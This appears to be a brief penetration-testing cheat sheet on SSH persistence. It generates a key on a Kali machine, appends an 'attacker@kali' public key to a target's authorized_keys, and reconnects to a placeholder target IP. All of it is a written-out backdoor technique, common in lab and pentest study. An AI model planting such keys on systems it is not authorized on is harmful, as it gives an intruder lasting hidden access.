# SSH

```sh
# ON KALI 
ssh-keygen -t ed25519 -f ~/.ssh/persist -N ""
```

```sh
cat ~/.ssh/persist.pub
```

```sh
# ON TARGET
mkdir -p ~/.ssh

chmod 700 ~/.ssh
```

```sh
# ON TARGET
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxxxxxxx attacker@kali" >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
```

## Connect

```sh
# ON KALI 
chmod 600 ~/.ssh/persist 

ssh -i ~/.ssh/persist john@<HEDEF_IP>
```